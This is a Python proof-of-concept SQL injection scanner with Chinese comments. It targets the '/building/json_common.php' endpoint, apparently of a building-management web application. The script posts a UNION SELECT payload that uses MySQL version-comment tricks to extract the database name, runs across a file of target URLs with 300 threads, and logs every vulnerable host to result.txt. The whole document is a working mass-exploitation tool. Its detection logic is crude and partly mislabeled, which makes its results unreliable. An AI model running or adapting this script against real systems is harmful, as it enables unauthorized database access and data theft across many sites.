import requests, re, argparse, time, sys  
from multiprocessing.dummy import Pool    
requests.packages.urllib3.disable_warnings()  
  
# 定义用于检测SQL注入漏洞的函数  
def poc(target):  
    # 构造注入的URL路径  
    payload_url = "/building/json_common.php"  
    url = target + payload_url  
    # 设置HTTP请求头  
    headers = {  
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",  
        "Content-Length": "83",  
        "Connection": "close",  
        "Content-Type": "application/x-www-form-urlencoded",  
        "Upgrade-Insecure-Requests": "1",  
        "Accept-Encoding": "gzip, deflate"  
    }  
    # 构造SQL注入的POST数据  
    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,database() ,4#|2|333"  
    try:  
        # 发送POST请求到构造的URL  
        res = requests.post(url=url, headers=headers, data=data, verify=False)  
        # 发送一个GET请求到目标URL
        res1 = requests.get(target, verify=False)  
  
        # 检查GET请求的响应状态码是否为200  
        if res1.status_code == 200:  
            # 检查POST请求的响应状态码是否为200，并且响应内容不为空  
            if res.status_code == 200 and res.text != "":  
                # 如果满足条件，则认为存在SQL注入漏洞  
                print(f"[+]该url存在SQL注入漏洞：{target}")  
                with open("result.txt", "a", encoding="utf-8") as f:  
                    f.write(target + "\n")  
            else:  
                # 如果POST请求失败或响应内容为空，则认为不存在信息泄露漏洞（这个逻辑可能需要根据实际场景调整）  
                print(f"[-]该url不存在信息泄露漏洞：{target}")  
        else:  
            # 如果GET请求失败，则打印连接失败信息  
            print(f"该url连接失败：{target}")  
    except:  
        # 如果发生异常，则打印错误信息  
        print(f"[*]该url出现错误：{target}")  
  
# 定义主函数  
def main():  
    # 创建一个对象，用于处理命令行参数  
    parser = argparse.ArgumentParser()  
    # 添加参数-u或--url，用于指定单个URL  
    parser.add_argument("-u", "--url", dest="url", type=str, help="请输入链接")  
    # 添加参数-f或--file，用于指定包含多个URL的文件路径  
    parser.add_argument("-f", "--file", dest="file", type=str, help="请输入文件路径")  
    # 解析命令行参数  
    args = parser.parse_args()  
  
    # 如果指定了URL且未指定文件，则对单个URL进行漏洞检测  
    if args.url and not args.file:  
        poc(args.url)  
    # 如果指定了文件且未指定URL，则对文件中的每个URL进行多线程漏洞检测  
    elif args.file and not args.url:  
        url_list = []  
        with open(args.file, "r", encoding="utf-8") as f:  
            for i in f.readlines():  
                # 去除URL前后的空格和换行符
                url_list.append(i.strip().replace("\n", ""))  
        # 创建一个线程池，并设置线程数为300
        mp = Pool(300)  
        # 使用线程池对列表中的每个URL进行漏洞检测  
        mp.map(poc, url_list)  
        # 关闭线程池并等待所有线程完成  
        mp.close()  
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")

if __name__ == "__main__":
    main()